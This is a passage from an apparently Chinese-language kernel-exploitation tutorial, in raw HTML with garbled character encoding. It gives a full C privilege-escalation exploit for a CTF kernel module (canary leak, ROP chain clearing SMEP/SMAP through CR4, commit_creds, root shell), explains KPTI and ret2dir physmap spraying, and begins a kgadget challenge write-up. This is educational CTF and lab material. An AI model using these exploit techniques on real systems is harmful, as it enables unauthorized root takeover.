c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RAX_RET 0xffffffff810520cf</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET 0xffffffff8106669c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AND_RAX_RDI_RET 0xffffffff8102b45b</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSHFQ_POP_RBX_RET 0xffffffff81131da4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ 0xffffffff813eb448</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008da</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *);<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">coreRead</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setOffValue</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds_ptr = commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred_ptr = prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    <span class="hljs-type">size_t</span> canary;<br>    setOffValue(fd, <span class="hljs-number">64</span>);<br>    coreRead(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)<br>        rop_chain[i] = canary;<br><br>    rop_chain[i++] = MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET + offset;<br>    rop_chain[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>    rop_chain[i++] = AND_RAX_RDI_RET + offset;<br>    rop_chain[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)getRootPrivilige;<br>    rop_chain[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span> + offset;<br>    rop_chain[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[i++] = (<span class="hljs-type">size_t</span>)getRootShell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯å®Œæˆææƒ</p>
<p><img src="https://s2.loli.net/2022/05/07/YE5fAK7rQRhcpXG.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>è¿™é‡Œç¬”è€…é€‰æ‹©çš„ CPU å‹å· <code>qemu64-v1</code> å…¶å®æ˜¯åœ¨æˆ‘ä»¬ä¸æŒ‡å®šæ—¶ QEMU é»˜è®¤ä½¿ç”¨çš„ CPU å‹å·ï¼Œä½†æ˜¯ä½ å¯ä»¥çœ‹åˆ°ä¸€èˆ¬çš„æ¯”èµ›ä½¿ç”¨çš„éƒ½æ˜¯ <code>kvm64</code> è¿™ä¸€å‹å·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ QEMU å¯ç”¨çš„ CPU å‹å·åŠè¯´æ˜</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 -cpu <span class="hljs-built_in">help</span><br>Available CPUs:<br>...<br>x86 kvm64                 (<span class="hljs-built_in">alias</span> configured by machine <span class="hljs-built_in">type</span>)<br>...<br>x86 qemu64-v1             QEMU Virtual CPU version 2.5+<br>...<br></code></pre></td></tr></table></figure>

<p>å› æ­¤å¤§å®¶é»˜è®¤ä¼šä½¿ç”¨ <code>kvm64</code> è¿™ä¸€å‹å·ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿™é‡Œç¬”è€…è¦ç‰¹æ„æŒ‡å®šæˆ <code>qemu64-v1</code> å‘¢ï¼Œè¿™æ˜¯å› ä¸ºç¬”è€…å‘ç°å…¶ä»–å‹å·çš„ CPU <strong>åœ¨å…³é—­ smepã€smap åä»æ— æ³•æ­£å¸¸åœ° ret2usr</strong>ï¼Œä¼šåœ¨è®¿é—®ç”¨æˆ·ç©ºé—´æ—¶è§¦å‘ç¼ºé¡µå¼‚å¸¸</p>
<p><img src="https://s2.loli.net/2022/05/07/DNvQq6WlsUm9zFa.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é€ æˆè¿™ç§ç°è±¡çš„åŸå› æ˜¯å› ä¸º<strong>KPTI æœºåˆ¶ï¼Œå¯¹äºå¼€å¯äº† KPTI çš„å†…æ ¸è€Œè¨€ï¼Œå†…æ ¸é¡µè¡¨çš„ç”¨æˆ·åœ°å€ç©ºé—´æ— æ‰§è¡Œæƒé™</strong>ï¼Œå› æ­¤å½“å†…æ ¸å°è¯•æ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç æ—¶ï¼Œç”±äºå¯¹åº”é¡µé¡¶çº§è¡¨é¡¹æ²¡æœ‰è®¾ç½®å¯æ‰§è¡Œä½ï¼Œå› æ­¤ä¼šç›´æ¥ panic</p>
<p>kpti åœ¨ <code>qemu64-v1</code> ä¸Šé»˜è®¤æ˜¯å…³é—­çš„ï¼Œä½†åœ¨å…¶ä»–å‹å· CPU ä¸Šé»˜è®¤æ˜¯å¼€å¯çš„ï¼Œæ‰€ä»¥è¿™é‡Œç¬”è€…é€‰ç”¨è¯¥å‹å·æ¥ä½œä¸ºä¿®æ”¹ cr4 è¿›è¡Œ smep&#x2F;smap bypass çš„ä¾‹é¢˜ï¼Œ<strong>ä½†å®é™…ä¸Š ret2usr å·²ç»æ˜¯è¿‡å»å¼äº†</strong></p>
</blockquote>
<h1 id="0x03-Kernel-ROP-ret2dir"><a href="#0x03-Kernel-ROP-ret2dir" class="headerlink" title="0x03.Kernel ROP - ret2dir"></a>0x03.Kernel ROP - ret2dir</h1><blockquote>
<p><del>ç¬”è€…ç¬¬ä¸€æ¬¡è§è¿™ä¸ªåå­—çš„æ—¶å€™è¿˜ä»¥ä¸ºæ˜¯ return to directoryï¼šè¿”å›è‡³æ–‡ä»¶å¤¹çš„æ”»å‡»ï¼Œä½†ç°åœ¨ä»”ç»†æƒ³æ¥è‡³å°‘è‹±æ–‡çŒœçš„å·®ä¸å¤šå¯¹</del>ï¼ˆ</p>
</blockquote>
<p>ret2dir æ˜¯å“¥ä¼¦æ¯”äºšå¤§å­¦ç½‘ç»œå®‰å…¨å®éªŒå®¤åœ¨ 2014 å¹´æå‡ºçš„ä¸€ç§è¾…åŠ©æ”»å‡»æ‰‹æ³•ï¼Œä¸»è¦ç”¨æ¥<strong>ç»•è¿‡ smepã€smapã€pxn ç­‰ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´éš”ç¦»çš„é˜²æŠ¤æ‰‹æ®µ</strong>ï¼ŒåŸè®ºæ–‡è§æ­¤å¤„<a target="_blank" rel="noopener" href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf">http://www.cs.columbia.edu/~vpk&#x2F;papers&#x2F;ret2dir.sec14.pdf</a></p>
<p>æˆ‘ä»¬é¦–å…ˆæ¥æ€è€ƒä¸€ä¸‹ <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/Documentation/x86/x86_64/mm.rst">x86 ä¸‹çš„ Linux kernel çš„å†…å­˜å¸ƒå±€</a>ï¼Œå­˜åœ¨ç€è¿™æ ·çš„ä¸€å—åŒºåŸŸå«åš <code>direct mapping area</code>ï¼Œå³å†…æ ¸çš„ <code>çº¿æ€§æ˜ å°„åŒº</code>ï¼Œ<strong>çº¿æ€§åœ°ç›´æ¥æ˜ å°„äº†æ•´ä¸ªç‰©ç†å†…å­˜ç©ºé—´</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rst">ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)<br></code></pre></td></tr></table></figure>

<blockquote>
<p>å¥½åƒä¹Ÿæ²¡æœ‰å•¥è¯‘åï¼Œä½†æ˜¯å«ç›´æ¥æ˜ å°„åŒºå¤ªéš¾å¬ï¼Œå› ä¸ºè¿™å—æ˜ å°„æ˜¯çº¿æ€§çš„ï¼ˆlinearï¼‰ï¼Œç¬”è€…å°±ä¸€ç›´å«ä»–çº¿æ€§æ˜ å°„åŒº</p>
<blockquote>
<p>åœ¨ 32 ä½ä¸‹è¿™å—åŒºåŸŸä¼¼ä¹åªèƒ½å  896 MBï¼Œè™½ç„¶ 32 ä½ä¸‹æœ‰æœ€å¤§ 4G çš„å†…å­˜ç©ºé—´ï¼Œä¸è¿‡è™½ç„¶åŒæ ·æ˜¯çº¿æ€§æ˜ å°„åŒºï¼Œ 32 ä½å’Œ 64 ä½çš„å†…å­˜å¸ƒå±€è¿˜æ˜¯æœ‰äº›è®¸ä¸åŒçš„ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦è¿˜æ˜¯å…³æ³¨ 64 ä½</p>
</blockquote>
<p>ç¬”è€…çŒœæµ‹ï¼šbuddy system åº”å½“æ˜¯é€šè¿‡è¿™å—æ˜ å°„æ¥ç®¡ç†æ•´ä¸ªç‰©ç†å†…å­˜ç©ºé—´çš„ï¼Œå°šæœªæŸ¥è¯è¿‡æºç </p>
<p>è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡º Linux åœ¨ 4çº§é¡µè¡¨ï¼ˆåœ°å€é•¿åº¦ 48 bitï¼‰ä¸‹çš„æœ€å¤§å†…å­˜åº”å½“ä¸º 64 TB è€Œå¹¶é 256 TBï¼Œè‡³äºä¸ºä»€ä¹ˆç¼©æ°´äº†é‚£ä¹ˆå¤šé‚£æ˜¯å¦ä¸€ä¸ªæ•…äº‹â€¦</p>
<p>å½“éœ€è¦ç”¨åˆ°å¤§äº 64 TB çš„å†…å­˜æ—¶ï¼Œå°±è¦å¼€å¯ 5 çº§é¡µè¡¨äº†ï¼Œè¿™ç§æƒ…å†µæ¯”è¾ƒå¤æ‚ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å…ˆä¸æ·±å…¥è®¨è®º</p>
</blockquote>
<p>è¿™å—åŒºåŸŸçš„å­˜åœ¨æ„å‘³ç€ï¼šå¯¹äºä¸€ä¸ªè¢«ç”¨æˆ·è¿›ç¨‹ä½¿ç”¨çš„ç‰©ç†é¡µæ¡†ï¼Œ<strong>åŒæ—¶å­˜åœ¨ç€ä¸€ä¸ªç”¨æˆ·ç©ºé—´åœ°å€ä¸å†…æ ¸ç©ºé—´åœ°å€åˆ°è¯¥ç‰©ç†é¡µæ¡†çš„æ˜ å°„</strong>ï¼Œå³æˆ‘ä»¬åˆ©ç”¨è¿™ä¸¤ä¸ªåœ°å€è¿›è¡Œå†…å­˜è®¿é—®æ—¶è®¿é—®çš„æ˜¯åŒä¸€ä¸ªç‰©ç†é¡µæ¡†</p>
<p>å½“å¼€å¯äº† SMEPã€SMAPã€PXN ç­‰é˜²æŠ¤æ—¶ï¼Œå†…æ ¸ç©ºé—´åˆ°ç”¨æˆ·ç©ºé—´çš„ç›´æ¥è®¿é—®è¢«ç¦æ­¢ï¼Œ<strong>æˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨ç±»ä¼¼ ret2usr è¿™æ ·çš„æ”»å‡»æ–¹å¼</strong>ï¼Œä½†åˆ©ç”¨å†…æ ¸çº¿æ€§æ˜ å°„åŒºå¯¹æ•´ä¸ªç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€ä¸ªå†…æ ¸ç©ºé—´ä¸Šçš„åœ°å€è®¿é—®åˆ°ç”¨æˆ·ç©ºé—´çš„æ•°æ®ï¼Œä»è€Œç»•è¿‡ SMEPã€SMAPã€PXN ç­‰ä¼ ç»Ÿçš„éš”ç»ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„é˜²æŠ¤æ‰‹æ®µ</strong></p>
<p>ä¸‹å›¾ä¾¿æ˜¯åŸè®ºæ–‡ä¸­å¯¹ ret2dir è¿™ç§æ”»å‡»çš„ç¤ºä¾‹ï¼Œæˆ‘ä»¬åœ¨ç”¨æˆ·ç©ºé—´ä¸­å¸ƒç½®çš„ gadget å¯ä»¥é€šè¿‡ direct mapping area ä¸Šçš„åœ°å€<strong>åœ¨å†…æ ¸ç©ºé—´ä¸­è®¿é—®åˆ°</strong></p>
<p><img src="https://s2.loli.net/2022/05/15/2QMrXEh9qLymCoK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä½†éœ€è¦æ³¨æ„çš„æ˜¯<strong>åœ¨æ–°ç‰ˆçš„å†…æ ¸å½“ä¸­ direct mapping area å·²ç»ä¸å†å…·æœ‰å¯æ‰§è¡Œæƒé™</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆéš¾å†åœ¨ç”¨æˆ·ç©ºé—´ç›´æ¥å¸ƒç½® shellcode è¿›è¡Œåˆ©ç”¨ï¼Œ<strong>ä½†æˆ‘ä»¬ä»èƒ½é€šè¿‡åœ¨ç”¨æˆ·ç©ºé—´å¸ƒç½® ROP é“¾çš„æ–¹å¼å®Œæˆåˆ©ç”¨</strong></p>
<p><img src="https://s2.loli.net/2022/05/15/CP4h5UA2svuwKbJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>åŸºæœ¬ä¸Šå¸ƒç½® shellcode çš„æ–¹æ³•å·²ç»å¾ˆéš¾ç›´æ¥å®Œæˆåˆ©ç”¨äº†ï¼Œæ¯•ç«Ÿè¿™æ˜¯ä¸€ç¯‡14å¹´çš„å¤è€è®ºæ–‡ï¼Œç¨å¾®æ–°ä¸€ç‚¹çš„å†…æ ¸çš„ direct mapping area éƒ½ä¸å†å…·æœ‰å¯æ‰§è¡Œæƒé™â€¦ </p>
</blockquote>
<p>æ¯”è¾ƒæœ´ç´ çš„ä¸€ç§ä½¿ç”¨ ret2dir è¿›è¡Œæ”»å‡»çš„æ‰‹æ³•ä¾¿æ˜¯ï¼š</p>
<ul>
<li><p>åˆ©ç”¨ mmap åœ¨ç”¨æˆ·ç©ºé—´å¤§é‡å–·å°„å†…å­˜</p>
</li>
<li><p>åˆ©ç”¨æ¼æ´æ³„éœ²å‡ºå†…æ ¸çš„â€œå †â€ä¸Šåœ°å€ï¼ˆé€šè¿‡ kmalloc è·å–åˆ°çš„åœ°å€ï¼‰ï¼Œ<strong>è¿™ä¸ªåœ°å€ç›´æ¥æ¥è‡ªäºçº¿æ€§æ˜ å°„åŒº</strong></p>
</li>
<li><p>åˆ©ç”¨æ³„éœ²å‡ºçš„å†…æ ¸çº¿æ€§æ˜ å°„åŒºçš„åœ°å€<strong>è¿›è¡Œå†…å­˜æœç´¢</strong>ï¼Œä»è€Œæ‰¾åˆ°æˆ‘ä»¬åœ¨ç”¨æˆ·ç©ºé—´å–·å°„çš„å†…å­˜</p>
</li>
</ul>
<p><strong>æ­¤æ—¶æˆ‘ä»¬å°±è·å¾—äº†ä¸€ä¸ªæ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´çš„å†…æ ¸ç©ºé—´åœ°å€ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªå†…æ ¸ç©ºé—´åœ°å€ä¾¿èƒ½ç›´æ¥è®¿é—®åˆ°ç”¨æˆ·ç©ºé—´çš„æ•°æ®ï¼Œä»è€Œé¿å¼€äº†ä¼ ç»Ÿçš„éš”ç»ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„é˜²æŠ¤æ‰‹æ®µ</strong></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬å¾€å¾€æ²¡æœ‰å†…å­˜æœç´¢çš„æœºä¼šï¼Œå› æ­¤éœ€è¦<strong>ä½¿ç”¨ mmap å–·å°„å¤§é‡çš„ç‰©ç†å†…å­˜å†™å…¥åŒæ ·çš„ payload</strong>ï¼Œä¹‹åå†éšæœºæŒ‘é€‰ä¸€ä¸ªçº¿æ€§æ˜ å°„åŒºä¸Šçš„åœ°å€è¿›è¡Œåˆ©ç”¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±<strong>æœ‰å¾ˆå¤§çš„æ¦‚ç‡å‘½ä¸­åˆ°æˆ‘ä»¬å¸ƒç½®çš„ payload ä¸Š</strong>ï¼Œè¿™ç§æ”»å‡»æ‰‹æ³•ä¹Ÿç§°ä¸º <code>physmap spray</code></p>
<blockquote>
<p>è¿˜æ˜¯å»ºè®®å¤§å®¶æŠŠè®ºæ–‡åŸæ–‡çœ‹ä¸€é23333</p>
</blockquote>
<h2 id="ä¾‹é¢˜ï¼šMINI-LCTF2022-kgadget"><a href="#ä¾‹é¢˜ï¼šMINI-LCTF2022-kgadget" class="headerlink" title="ä¾‹é¢˜ï¼šMINI-LCTF2022 - kgadget"></a>ä¾‹é¢˜ï¼šMINI-LCTF2022 - kgadget</h2><blockquote>
<p>ç¬”è€…åœ¨æ ¡å†…èµ›å‡ºçš„ä¸€é“é¢˜ç›®ï¼Œç®—æ˜¯ä¸€é“ ret2dir çš„ä¾‹é¢˜ï¼Œ<del>å› ä¸ºç½‘ä¸Šå®åœ¨æ˜¯æ²¡æœ‰è¿™ä¸€å—çš„é¢˜ç›®â€¦</del></p>
<p><a href="/download/minil2022/pwn/kgadget.tar.xz" title="ç‚¹æ­¤ä¸‹è½½åŸé¢˜é™„ä»¶">ç‚¹å‡»ä¸‹è½½-kgadget.tar.xz</a></p>
</blockquote>
<h3 id="â‘ -åˆ†æ-1"><a href="#â‘ -åˆ†æ-1" class="headerlink" title="â‘  åˆ†æ"></a>â‘  åˆ†æ</h3><p>è¿˜æ˜¯æƒ¯ä¾‹çš„ç»™äº†ä¸ªæœ‰æ¼æ´çš„é©±åŠ¨ï¼Œé€†èµ·æ¥å…¶å®å¹¶ä¸éš¾ï¼Œå”¯ä¸€æœ‰ç”¨çš„å°±æ˜¯ ioctlï¼Œè‹¥ ioctl çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º 114514 åˆ™ä¼šå°†ç¬¬ä¸‰ä¸ªå‚æ•°ä½œä¸ºæŒ‡é’ˆè¿›è¡Œè§£å¼•ç”¨ï¼Œå–å…¶æ‰€æŒ‡åœ°å€ä¸Šå€¼ä½œä¸ºå‡½æ•°æŒ‡é’ˆè¿›è¡Œæ‰§è¡Œï¼ˆè¿™é‡Œç¼–è¯‘å™¨å°†å…¶ä¼˜åŒ–ä¸º <code>__x86_indirect_thunk_rbx()</code> ï¼Œå…¶å®æœ¬è´¨ä¸Šå°±æ˜¯ <code>call rbx</code> ï¼‰</p>
<p><img src="https://s2.loli.net/2022/05/07/WyuTvUgxO1nQKGa.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨å¯åŠ¨è„šæœ¬ä¸­å¼€å¯äº† smep ä¸ smap ä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½å¤Ÿç›´æ¥åœ¨ç”¨æˆ·ç©ºé—´æ„é€  rop ç„¶å ret2usrï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰å¼€å¯ kaslrï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¸éœ€è¦æ³„éœ²å†…æ ¸åŸºå€</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 128M \<br>    -cpu kvm64,+smep,+smap \<br>    -smp cores=2,threads=2 \<br>    -kernel bzImage \<br>    -initrd ./rootfs.cpio \<br>    -nographic \<br>    -monitor /dev/null \<br>    -snapshot \<br>    -append <span class="hljs-string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \<br>    -no-reboot<br></code></pre></td></tr></table></figure>

<h3 id="â‘¡-æ¼æ´åˆ©ç”¨ï¼šret2dir-physmap-spray"><a href="#â‘¡-æ¼æ´åˆ©ç”¨ï¼šret2dir-physmap-spray" class="headerlink" title="â‘¡ æ¼æ´åˆ©ç”¨ï¼šret2dir + physmap spray"></a>â‘¡ æ¼æ´åˆ©ç”¨ï¼šret2dir + physmap spray</h3><p>å› ä¸ºæˆ‘ä»¬æ²¡æ³•ç›´æ¥åœ¨å†…æ ¸ç©ºé—´ç›´æ¥æ‰¾åˆ°ä¸€ä¸ªè¿™æ ·çš„ç›®æ ‡ï¼ˆå†…æ ¸ç©ºé—´ä¸­è™½ç„¶å­˜åœ¨èƒ½å¤Ÿè¿™æ ·è¿›è¡Œè°ƒç”¨çš„å‡½æ•°æŒ‡é’ˆï¼Œä¾‹å¦‚ tty è®¾å¤‡é»˜è®¤çš„å‡½æ•°è¡¨<code>ptm_unix98_ops</code> ä¸€ç±»çš„ï¼Œä½†æ˜¯è¿™äº›å‡½æ•°è¡¨å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆå¯¹æˆ‘ä»¬æ¥è¯´æ²¡æœ‰ç”¨ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å»<strong>åœ¨å†…æ ¸ç©ºé—´å¸ƒç½®æˆ‘ä»¬çš„å‡½æ•°æŒ‡é’ˆä¸ rop chain</strong>ï¼Œä¹‹åæˆ‘ä»¬ä¼ å…¥æˆ‘ä»¬å¸ƒç½®çš„ gadget 